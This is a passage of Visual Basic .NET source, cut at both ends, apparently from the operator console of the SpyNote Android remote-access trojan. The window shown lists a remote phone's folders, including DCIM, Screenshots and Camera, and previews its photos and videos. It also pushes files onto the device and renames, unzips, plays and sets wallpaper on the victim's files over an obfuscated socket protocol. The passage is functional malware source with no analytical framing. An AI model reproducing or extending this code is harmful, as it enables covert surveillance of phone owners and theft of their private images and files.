                Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth
            End If
            Dim flag5 As Boolean = columnsWidth > Me.ViewManager.Width
            If flag5 Then
                Dim flag6 As Boolean = Not Me.VisualStudioHorizontalScrollBar1.Visible
                If flag6 Then
                    Me.VisualStudioHorizontalScrollBar1.Visible = True
                End If
            Else
                Dim flag7 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
                If flag7 Then
                    Me.VisualStudioHorizontalScrollBar1.Visible = False
                End If
            End If
            Dim flag8 As Boolean = Me.ViewManager.Rows.Count > 0
            If flag8 Then
                Dim num As Integer = Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height
                Dim flag9 As Boolean = num > Me.ViewManager.Height
                If flag9 Then
                    Dim flag10 As Boolean = Not Me.VisualStudioVerticalScrollBar1.Visible
                    If flag10 Then
                        Me.VisualStudioVerticalScrollBar1.Visible = True
                    End If
                Else
                    Dim flag11 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                    If flag11 Then
                        Me.VisualStudioVerticalScrollBar1.Visible = False
                    End If
                End If
            Else
                Dim flag12 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                If flag12 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = False
                End If
            End If
        End If
    End Sub

    Private Function IMG(ByVal n As Bitmap, ByVal ext As String) As Object
        Dim bitmap As Object
        Dim color As System.Drawing.Color = System.Drawing.Color.FromArgb(74, 74, 75)
        If (Not ext.EndsWith("(0)")) Then
            color = If(Not ext.StartsWith("Folder Files"), System.Drawing.Color.FromArgb(74, 74, 75), System.Drawing.Color.FromArgb(82, 70, 56))
        Else
            color = System.Drawing.Color.FromArgb(56, 56, 59)
        End If
        Dim size As System.Drawing.Size = n.Size
        Dim bitmap1 As System.Drawing.Bitmap = New System.Drawing.Bitmap(35, 35)
        Dim num As Integer = 18 - CInt(Math.Round(CDbl(size.Width) / 2)) - 3
        Dim num1 As Integer = 18 - CInt(Math.Round(CDbl(size.Height) / 2)) - 3
        Using bitmap2 As System.Drawing.Bitmap = New System.Drawing.Bitmap(bitmap1.Width - 3, bitmap1.Height - 3)
            Using graphic As Graphics = Graphics.FromImage(bitmap2)
                graphic.SmoothingMode = SmoothingMode.AntiAlias
                graphic.FillEllipse(New SolidBrush(color), 0, 0, bitmap1.Width - 6, bitmap1.Height - 6)
                graphic.DrawImage(n, New Rectangle(num, num1, n.Width, n.Height))
                Using textureBrush As System.Drawing.TextureBrush = New System.Drawing.TextureBrush(bitmap1)
                    textureBrush.TranslateTransform(0!, 0!)
                    Using graphicsPath As System.Drawing.Drawing2D.GraphicsPath = New System.Drawing.Drawing2D.GraphicsPath()
                        graphicsPath.AddEllipse(0, 0, bitmap1.Width - 6, bitmap1.Height - 6)
                        graphic.FillPath(textureBrush, graphicsPath)
                    End Using
                End Using
            End Using
            bitmap = New System.Drawing.Bitmap(bitmap2)
        End Using
        Return bitmap
    End Function
    Private Sub LBER_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LBER.Click
        Me.PNLERRORS.Visible = False
    End Sub

    Private Sub NF()
        If (Me.ViewManager.Rows.Count <= 0) Then
            If (Me.PCNOTF.Dock = DockStyle.None) Then
                Me.PCNOTF.Dock = DockStyle.Fill
            End If
            If (Not Me.PCNOTF.Visible) Then
                Me.PCNOTF.Visible = True
            End If
        Else
            If (Me.PCNOTF.Dock = DockStyle.Fill) Then
                Me.PCNOTF.Dock = DockStyle.None
            End If
            If (Me.PCNOTF.Visible) Then
                Me.PCNOTF.Visible = False
            End If
        End If
    End Sub

    Private Sub PasteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles PasteToolStripMenuItem.Click
        If (Operators.CompareString(Me.Clipboard_Copy, Nothing, False) <> 0) Then
            If (Operators.CompareString(Me.Path_Copy, Nothing, False) <> 0) Then
                Dim strArrays() As String = {"[*N\O*]"}
                Dim strArrays1 As String() = Me.Clipboard_Copy.Split(strArrays, StringSplitOptions.RemoveEmptyEntries)
                Dim strArrays2() As String = {"[*P\T*]"}
                Dim strArrays3 As String() = Me.Path_Copy.Split(strArrays2, StringSplitOptions.RemoveEmptyEntries)
                Dim length As Integer = CInt((CLng(strArrays1.Length) - CLng(1)))
                For i As Integer = 0 To length Step 1
                    Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(43)), Data.SplitData, strArrays3(i), Data.SplitData, strArrays1(i), Data.SplitData, Me.TEXTPATH.Text, "/", Data.SplitData, Conversions.ToString(False)}))
                Next

            End If
        End If
        If (Operators.CompareString(Me.Clipboard_Cut, Nothing, False) <> 0) Then
            If (Operators.CompareString(Me.Path_Cut, Nothing, False) <> 0) Then
                Dim strArrays4() As String = {"[*N\O*]"}
                Dim strArrays5 As String() = Me.Clipboard_Cut.Split(strArrays4, StringSplitOptions.RemoveEmptyEntries)
                Dim strArrays6() As String = {"[*P\T*]"}
                Dim strArrays7 As String() = Me.Path_Cut.Split(strArrays6, StringSplitOptions.RemoveEmptyEntries)
                Dim num As Integer = CInt((CLng(strArrays5.Length) - CLng(1)))
                For j As Integer = 0 To num Step 1
                    Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(43)), Data.SplitData, strArrays7(j), Data.SplitData, strArrays5(j), Data.SplitData, Me.TEXTPATH.Text, "/", Data.SplitData, Conversions.ToString(True)}))
                Next

            End If
        End If
        Me.Path_Cut = Nothing
        Me.Path_Copy = Nothing
        Me.Clipboard_Cut = Nothing
        Me.Clipboard_Copy = Nothing
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Me.GetPath(Me.TEXTPATH.Text)
    End Sub

    Private Sub RefScrolls()
        Dim num As Integer = 0
        If (MyBase.Visible) Then
            SyncLock Me.ViewManager
                If (Me.ViewManager.Rows.Count > 0) Then
                    If (Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height > Me.ViewManager.Height) Then
                        num = CInt(Math.Round(CDbl(Me.ViewManager.Height) / CDbl(Me.ViewManager.Rows(0).Height))) - 2
                        If (num < 0) Then
                            num = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar1.Maximum = Me.ViewManager.Rows.Count - num
                Me.GridViewoVerticalScrollBar0()
                If (Me.indxOld <> -1) Then
                    Me.ToEndViewManager(Me.indxOld)
                End If
            End SyncLock
        End If
    End Sub

    Private Sub RemovObjOld(ByVal Old As String)
        Dim count As Integer = Me.aLISTObject.Count - 1
        For i As Integer = 0 To count Step 1
            Try
                If (Not Old.StartsWith(DirectCast(Me.aLISTObject(i), List(Of String))(0))) Then
                    Me.aLISTObject.RemoveAt(i)
                End If
            Catch exception As System.Exception
            End Try
        Next

    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RenameToolStripMenuItem.Click
        Try
            Dim index As Integer = 0
            If (Me.ViewManager.Rows.Count <= 0) Then
                Me.ViewManager.EditMode = DataGridViewEditMode.EditProgrammatically
            ElseIf (Me.ViewManager.Rows.GetRowCount(DataGridViewElementStates.Selected) = 1) Then
                If (Me.ViewManager.SelectedRows.Count = 1) Then
                    For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                        index = Me.ViewManager.SelectedRows(i).Index
                    Next

                End If
                If (index <> -1) Then
                    Me.ViewManager.CurrentCell = Me.ViewManager.Rows(index).Cells(1)
                    Me.ViewManager.Rows(index).Selected = True
                    Me.ViewManager.EditMode = DataGridViewEditMode.EditOnEnter
                End If
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Screenshots_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Screenshots.Click
        If (Me.TEXTPATH.Enabled) Then
            Me.BTNNEXT0.Tag = Nothing
            Me.BTNNEXT0.Enabled = False
            Me.BTNBACK0.Focus()
            Me.GetPath(CStr(Me.Screenshots.Tag))
        End If
    End Sub

    Private Function SearchObj(v0 As String) As Array
        Dim num As Integer = Me.aLISTObject.Count - 1
        For i As Integer = 0 To num
            Dim list As List(Of String) = CType(Me.aLISTObject(i), List(Of String))
            Dim flag As Boolean = Operators.CompareString(list(0), v0, False) = 0
            If flag Then
                Return New String() {list(0), list(1)}
            End If
        Next
        Return New Object(1) {}
    End Function

    Private Sub SetObj(ByVal v0 As String, ByVal v1 As String)
        If (Not Me.aBoolBack) Then
            Me.aLIST = New List(Of String)() From
            {
                v0,
                v1
            }
            Dim count As Integer = Me.aLISTObject.Count - 1
            Dim num As Integer = 0
            While num <= count
                If (Operators.CompareString(DirectCast(Me.aLISTObject(num), List(Of String))(0), v0, False) <> 0) Then
                    num = num + 1
                Else
                    Me.aLISTObject(num) = Me.aLIST
                    Return
                End If
            End While
            Me.aLISTObject.Add(Me.aLIST)
        End If
    End Sub

    Private Sub SetWallpaperToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles SetWallpaperToolStripMenuItem.Click
        If (Me.ViewManager.SelectedRows.Count = 1) Then
            For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(3).Value)
                If (Not str.StartsWith("Folder Files")) Then
                    If (Operators.CompareString(str.ToUpper(), ".PNG", False) = 0 Or Operators.CompareString(str.ToUpper(), ".BMP", False) = 0 Or Operators.CompareString(str.ToUpper(), ".JPG", False) = 0 Or Operators.CompareString(str.ToUpper(), ".JPEG", False) = 0) Then
                        Dim str1 As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(42)), Data.SplitData, Me.TEXTPATH.Text, "/", str1}))
                    End If
                End If
            Next

        End If
    End Sub

    Private Sub SPK(ByVal sender As Object, ByVal e As EventArgs)
        Try
            Dim tag As String = CStr(TryCast(sender, ToolStripMenuItem).Tag)
            If (Operators.CompareString(tag, Nothing, False) <> 0) Then
                If (Me.ViewManager.SelectedRows.Count = 1) Then
                    For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                        If (Not Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(3).Value).StartsWith("Folder Files")) Then
                            Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                            Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(60)), Data.SplitData, Me.TEXTPATH.Text, "/", str, Data.SplitData, tag}))
                        End If
                    Next

                End If
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub StartToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles StartToolStripMenuItem.Click
        If (Me.ViewManager.SelectedRows.Count = 1) Then
            For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(3).Value)
                If (Not str.StartsWith("Folder Files")) Then
                    If (Operators.CompareString(str.ToUpper(), ".3GP", False) = 0 Or Operators.CompareString(str.ToUpper(), ".MP4", False) = 0 Or Operators.CompareString(str.ToUpper(), ".MP3", False) = 0 Or Operators.CompareString(str.ToUpper(), ".M4A", False) = 0 Or Operators.CompareString(str.ToUpper(), ".WAV", False) = 0 Or Operators.CompareString(str.ToUpper(), ".AAC", False) = 0 Or Operators.CompareString(str.ToUpper(), ".MXMF", False) = 0 Or Operators.CompareString(str.ToUpper(), ".OGG", False) = 0 Or Operators.CompareString(str.ToUpper(), ".OTA", False) = 0 Or Operators.CompareString(str.ToUpper(), ".RTTL", False) = 0 Or Operators.CompareString(str.ToUpper(), ".RTX", False) = 0 Or Operators.CompareString(str.ToUpper(), ".TS", False) = 0) Then
                        Dim str1 As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(44)), Data.SplitData, Me.TEXTPATH.Text, "/", str1}))
                    End If
                End If
            Next

        End If
    End Sub

    Private Sub StopToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles StopToolStripMenuItem.Click
        If (Me.ViewManager.SelectedRows.Count = 1) Then
            For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(45)), Data.SplitData))
            Next

        End If
    End Sub

    Private Sub StorageDirectory_Click(ByVal sender As Object, ByVal e As EventArgs) Handles StorageDirectory.Click
        If (Me.TEXTPATH.Enabled) Then
            Me.BTNNEXT0.Tag = Nothing
            Me.BTNNEXT0.Enabled = False
            Me.BTNBACK0.Focus()
            Me.GetPath(CStr(Me.StorageDirectory.Tag))
        End If
    End Sub

    Public Sub TData(ByVal Ay As Array)
        Try
            Dim value As String = CStr(Ay.GetValue(0))
            If (Operators.CompareString(value, Store.BFF(Store.buff, CLng(112)), False) = 0) Then
                Me.LBER.Text = CStr(Operators.ConcatenateObject("File transfer completed :", Ay.GetValue(1)))
                Me.PNLERRORS.Visible = True
                Me.PNLERRORS.Refresh()
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(83)), False) = 0) Then
                Me.LBER.Text = CStr(Ay.GetValue(1))
                Me.PNLERRORS.Visible = True
                Me.PNLERRORS.Refresh()
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(84)), False) = 0) Then
                Dim str As String = Nothing
                Dim strArrays As String() = CStr(Ay.GetValue(2)).Split(New String() {Data.SplitPaths}, StringSplitOptions.RemoveEmptyEntries)
                Dim length As Integer = CInt(strArrays.Length) - 1
                Dim num As Integer = 0
                Do
                    Select Case num
                        Case 0
                            Me.StorageDirectory.Tag = strArrays(num)
                            Exit Select
                        Case 1
                            Me.DIRECTORY_DOWNLOADS.Tag = strArrays(num)
                            Exit Select
                        Case 2
                            Me.DIRECTORY_DCIM.Tag = strArrays(num)
                            Exit Select
                        Case 3
                            Me.DIRECTORY_PICTURES.Tag = strArrays(num)
                            Exit Select
                        Case 4
                            Me.Screenshots.Tag = strArrays(num)
                            Exit Select
                        Case 5
                            Me.Camera.Tag = strArrays(num)
                            Exit Select
                    End Select
                    num = num + 1
                Loop While num <= length
                Me.ViewManager.Rows.Clear()
                Dim strArrays1 As String() = CStr(Ay.GetValue(1)).Split(New String() {Data.SplitLines}, StringSplitOptions.RemoveEmptyEntries)
                Dim length1 As Integer = CInt(strArrays1.Length) - 1
                For i As Integer = 0 To length1 Step 1
                    Dim strArrays2 As String() = strArrays1(i).Split(New String() {Data.SplitArray}, StringSplitOptions.RemoveEmptyEntries)
                    If (Operators.CompareString(strArrays2(0), "-1", False) <> 0 And Operators.CompareString(strArrays2(1), "-1", False) <> 0 And Operators.CompareString(strArrays2(2), "-1", False) <> 0) Then
                        Dim extension As String = Nothing
                        Dim flag As Boolean = True
                        If (Operators.CompareString(strArrays2(0), Store.BFF(Store.buff, CLng(111)), False) <> 0) Then
                            extension = strArrays2(0)
                            If (extension.StartsWith("Folder Files")) Then
                                flag = False
                            End If
                        Else
                            Try
                                extension = (New FileInfo(strArrays2(1))).Extension
                            Catch exception As System.Exception
                                extension = "Unknown error"
                            End Try
                        End If
                        Dim value1 As String = Nothing
                        If (flag) Then
                            value1 = CStr(Store.BytesConverter(Conversions.ToLong(strArrays2(2))).GetValue(0))
                        End If
                        Dim num1 As Integer = 0
                        num1 = If(Not extension.StartsWith("Folder Files"), Me.imageList_0.Images.IndexOfKey(extension.ToUpper()), Me.imageList_0.Images.IndexOfKey("Folder Files".ToUpper()))
                        If (num1 = -1) Then
                            num1 = Me.imageList_0.Images.IndexOfKey("-1".ToUpper())
                        End If
                        Dim str1 As String = strArrays2(4)
                        Dim str2 As String = Strings.Space(1)
                        If (Operators.CompareString(str1, "n/a", False) <> 0) Then
                            If (Operators.CompareString(str1.Trim(), strArrays2(5).Trim(), False) = 0) Then
                                str2 = " (New)"
                            End If
                        End If
                        Me.ViewManager.Rows.Add(New Object() {Me.IMG(DirectCast(Me.imageList_0.Images(num1), Bitmap), extension), strArrays2(1), value1, extension, str1, str2})
                        If (flag) Then
                            Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(2).Tag = Conversions.ToLong(strArrays2(2))
                        End If
                        If (Operators.CompareString(str2, Strings.Space(1), False) <> 0) Then
                            Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(5).Style.ForeColor = Color.FromArgb(72, 201, 176)
                            Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(5).Style.SelectionForeColor = Color.FromArgb(72, 201, 176)
                        End If
                        If (Me.indxOld = -1) Then
                            If (Operators.ConditionalCompareObjectEqual(Me.SearchObj(Me.TEXTPATH.Text).GetValue(1), strArrays2(1), False)) Then
                                Me.indxOld = Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Index
                            End If
                        End If
                    End If
                    If (Operators.CompareString(str, strArrays2(3), False) <> 0) Then
                        str = strArrays2(3)
                        Me.TEXTPATH.Text = str
                        Me.TEXTPATH.Refresh()
                    End If
                Next

            End If
            Me.aBoolBack = False
            Me.aBoolNext = False
            If (Not Me.TEXTPATH.Enabled) Then
                Me.TEXTPATH.Enabled = True
            End If
        Catch exception1 As System.Exception
        End Try
        Try
            Me.NF()
        Catch exception2 As System.Exception
        End Try
    End Sub

    Private Sub ToEndViewManager(ByVal indxOld0 As Integer)
        Try
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = indxOld0
                Me.VisualStudioVerticalScrollBar1.Value = indxOld0
                Me.ViewManager.CurrentCell = Me.ViewManager.Rows(indxOld0).Cells(1)
                Me.ViewManager.Rows(indxOld0).Selected = True
                Me.indxOld = -1
            End If
        Catch exception As System.Exception
            Me.indxOld = -1
        End Try
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            Me.Text = String.Concat(MyBase.Name, Strings.Space(1), "-> Connection Lost ...")
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        ElseIf (Not Me.TClient.IsClose) Then
            If (CObj(Me.Text) <> CObj(MyBase.Name)) Then
                Me.Text = MyBase.Name
            End If
            If (Me.ProgressBar1.Colour1 <> Color.FromArgb(140, 140, 140)) Then
                Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
                Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            End If
            Me.ProgressBar1.Value = Me.TClient.mProgressBar(Store.BFF(Store.buff, CLng(14)), Store.BFF(Store.buff, CLng(15)))
        Else
            Me.Text = String.Concat(MyBase.Name, Strings.Space(1), "-> Connection Lost ...")
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TScrolls_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TScrolls.Tick
        Me.RefScrolls()
    End Sub

    Private Sub UnZipToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles UnZipToolStripMenuItem.Click
        If (Me.ViewManager.SelectedRows.Count > 0) Then
            For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(3).Value)
                If (Not str.StartsWith("Folder Files")) Then
                    If (Operators.CompareString(str.ToUpper(), ".ZIP", False) = 0) Then
                        Dim str1 As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(47)), Data.SplitData, Me.TEXTPATH.Text, "/", str1, Data.SplitData, Me.TEXTPATH.Text, "/"}))
                    End If
                End If
            Next

        End If
    End Sub

    Private Sub Upload(ByVal a As Array)
        Dim stringBuilder As System.Text.StringBuilder = New System.Text.StringBuilder()
        stringBuilder.Append(Convert.ToBase64String(File.ReadAllBytes(a.GetValue(0).ToString())))
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(36)), Data.SplitData, stringBuilder.ToString(), Data.SplitData, a.GetValue(1).ToString(), Data.SplitData, a.GetValue(2).ToString()}))
    End Sub

    Private Sub UploadFileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles UploadFileToolStripMenuItem.Click
        Dim fileBox As FileBox = New FileBox() With
        {
            .strGetFiles = "*.*",
            .Text = "Selcted Files"
        }
        fileBox.ThemeTextBox1.Visible = False
        fileBox.Label1.Visible = False
        If (fileBox.ShowDialog() <> System.Windows.Forms.DialogResult.OK) Then
            fileBox.Close()
        ElseIf (fileBox.BoxView1.SelectedRows.Count > 0) Then
            For i As Integer = fileBox.BoxView1.SelectedRows.Count - 1 To 0 Step -1
                Dim str As String = Conversions.ToString(Operators.ConcatenateObject(String.Concat(fileBox.TEXTPATH.Text, "\"), fileBox.BoxView1.SelectedRows(i).Cells(1).Value))
                If (File.Exists(str)) Then
                    Dim thread As System.Threading.Thread = New System.Threading.Thread(Sub(a0 As Object) Me.Upload(DirectCast(a0, Array)))
                    thread.Start(DirectCast((New Object() {str, Me.TEXTPATH.Text, fileBox.BoxView1.SelectedRows(i).Cells(1).Value}), Array))
                End If
            Next

        End If
    End Sub

    Private Sub ViewImge_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewImge.MouseDown
        Dim location As Point
        If (Me.oldX = 0 And Me.oldY = 0) Then
            location = Me.ViewImge.Location
            Me.oldX = location.X
            location = Me.ViewImge.Location
            Me.oldY = location.Y
        End If
        Dim x As Integer = Control.MousePosition.X
        location = Me.ViewImge.Location
        Me.x1 = x - location.X
        Dim y As Integer = Control.MousePosition.Y
        location = Me.ViewImge.Location
        Me.y1 = y - location.Y
    End Sub

    Private Sub ViewImge_MouseHover(ByVal sender As Object, ByVal e As EventArgs) Handles ViewImge.MouseHover
        Dim obj As Object
        If (Me.ViewManager.SelectedRows.Count = 1) Then
            For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(3).Value)
                Dim str1 As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                If (Operators.CompareString(str.ToUpper(), ".MP4", False) = 0 Or Operators.CompareString(str.ToUpper(), ".3GP", False) = 0) Then
                    If (Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(0).Tag IsNot Nothing) Then
                        If (Operators.CompareString(CStr(DirectCast(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(0).Tag, Object())(1)), "video", False) = 0) Then
                            If (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.ViewImge.Tag, "go", False)))) Then
                                Me.ViewImge.Tag = "go"
                                Dim tClient As SocketClient = Me.TClient
                                Dim splitData() As String = {Store.BFF(Store.buff, CLng(16)), Data.SplitData, Me.TEXTPATH.Text, Data.SplitData, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing}
                                If (Versioned.IsNumeric(Data.OptionsLines(2).Trim())) Then
                                    obj = Data.OptionsLines(2).Trim()
                                Else
                                    obj = 35
                                End If
                                splitData(4) = Conversions.ToString(obj)
                                splitData(5) = Data.SplitData
                                splitData(6) = str1
                                splitData(7) = Data.SplitData
                                splitData(8) = Conversions.ToString(Me.ViewManager.SelectedRows(i).Index)
                                splitData(9) = Data.SplitData
                                splitData(10) = "video"
                                tClient.Send(String.Concat(splitData))
                            End If
                        End If
                    End If
                End If
            Next

        End If
    End Sub

    Private Sub ViewImge_MouseLeave(ByVal sender As Object, ByVal e As EventArgs) Handles ViewImge.MouseLeave
        If (Operators.ConditionalCompareObjectEqual(Me.ViewImge.Tag, "go", False)) Then
            Me.ViewImge.Tag = Nothing
            Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(17)), Data.SplitData))
        End If
    End Sub
    Private Sub ViewImge_MouseMove(sender As Object, e As MouseEventArgs) Handles ViewImge.MouseMove
        Dim flag As Boolean = e.Button = MouseButtons.Left
        If flag Then
            Me.newpoint = Control.MousePosition
            Me.newpoint.X = Me.newpoint.X - Me.x1
            Me.newpoint.Y = Me.newpoint.Y - Me.y1
            Me.ViewImge.Location = Me.newpoint
            Application.DoEvents()
        End If
    End Sub
    Private Sub ViewImge_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewImge.MouseUp
        If (Me.oldX <> 0 And Me.oldY <> 0) Then
            Me.ViewImge.Location = New Point(Me.oldX, Me.oldY)
            Me.oldX = 0
            Me.oldY = 0
        End If
    End Sub

    Private Sub ViewManager_CellEndEdit(ByVal sender As Object, ByVal e As DataGridViewCellEventArgs) Handles ViewManager.CellEndEdit
        Try
            If (Operators.CompareString(Me.strNameFile, Nothing, False) <> 0) Then
                If (Operators.CompareString(Me.strNameFile.Trim(), Me.ViewManager.Rows(Me.idfile).Cells(1).Value.ToString().Trim(), False) <> 0) Then
                    Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(39)), Data.SplitData, Me.TEXTPATH.Text, "/", Me.strNameFile, Data.SplitData, Me.TEXTPATH.Text, "/", Me.ViewManager.Rows(Me.idfile).Cells(1).Value.ToString()}))
                End If
            End If
            Me.ViewManager.EditMode = DataGridViewEditMode.EditProgrammatically
            Me.ViewManager.Rows(Me.idfile).DefaultCellStyle.SelectionBackColor = Color.FromArgb(45, 45, 48)
        Catch ex As Exception

        End Try

    End Sub

    Private Sub ViewManager_CellMouseClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles ViewManager.CellMouseClick
        Dim obj As Object
        Dim obj1 As Object
        If (e.RowIndex <> -1) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.RowIndex >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.RowIndex)
        End If
        If (e.RowIndex <> -1) Then
            Dim str As String = Conversions.ToString(Me.ViewManager.Rows(e.RowIndex).Cells(3).Value)
            Dim str1 As String = Conversions.ToString(Me.ViewManager.Rows(e.RowIndex).Cells(1).Value)
            If (Operators.CompareString(str.ToUpper(), ".PNG", False) = 0 Or Operators.CompareString(str.ToUpper(), ".ICO", False) = 0 Or Operators.CompareString(str.ToUpper(), ".BMP", False) = 0 Or Operators.CompareString(str.ToUpper(), ".JPG", False) = 0 Or Operators.CompareString(str.ToUpper(), ".JPEG", False) = 0 Or Operators.CompareString(str.ToUpper(), ".GIF", False) = 0) Then
                If (Me.ViewManager.Rows(e.RowIndex).Cells(0).Tag IsNot Nothing) Then
                    Dim tag As Object() = DirectCast(Me.ViewManager.Rows(e.RowIndex).Cells(0).Tag, Object())
                    Me.ViewImge.Image = DirectCast(tag(0), Image)
                    If (Not Me.ViewImge.Visible) Then
                        Me.ViewImge.Visible = True
                    End If
                Else
                    Dim tClient As SN.Sockets.SpyNote.Client.SocketClient = Me.TClient
                    Dim splitData() As String = {Store.BFF(Store.buff, CLng(15)), Data.SplitData, Me.TEXTPATH.Text, Data.SplitData, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing}
                    If (Versioned.IsNumeric(Data.OptionsLines(1).Trim())) Then
                        obj1 = Data.OptionsLines(1).Trim()
                    Else
                        obj1 = 35
                    End If
                    splitData(4) = Conversions.ToString(obj1)
                    splitData(5) = Data.SplitData
                    splitData(6) = str1
                    splitData(7) = Data.SplitData
                    splitData(8) = Conversions.ToString(e.RowIndex)
                    splitData(9) = Data.SplitData
                    splitData(10) = "image"
                    tClient.Send(String.Concat(splitData))
                End If
            ElseIf (Operators.CompareString(str.ToUpper(), ".MP4", False) = 0 Or Operators.CompareString(str.ToUpper(), ".3GP", False) = 0) Then
                If (Me.ViewManager.Rows(e.RowIndex).Cells(0).Tag IsNot Nothing) Then
                    Dim objArray As Object() = DirectCast(Me.ViewManager.Rows(e.RowIndex).Cells(0).Tag, Object())
                    Me.ViewImge.Image = DirectCast(objArray(0), Image)
                    If (Not Me.ViewImge.Visible) Then
                        Me.ViewImge.Visible = True
                    End If
                Else
                    Dim socketClient As SN.Sockets.SpyNote.Client.SocketClient = Me.TClient
                    Dim strArrays() As String = {Store.BFF(Store.buff, CLng(15)), Data.SplitData, Me.TEXTPATH.Text, Data.SplitData, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing, Nothing}
                    If (Versioned.IsNumeric(Data.OptionsLines(2).Trim())) Then
                        obj = Data.OptionsLines(2).Trim()
                    Else
                        obj = 35
                    End If
                    strArrays(4) = Conversions.ToString(obj)
                    strArrays(5) = Data.SplitData
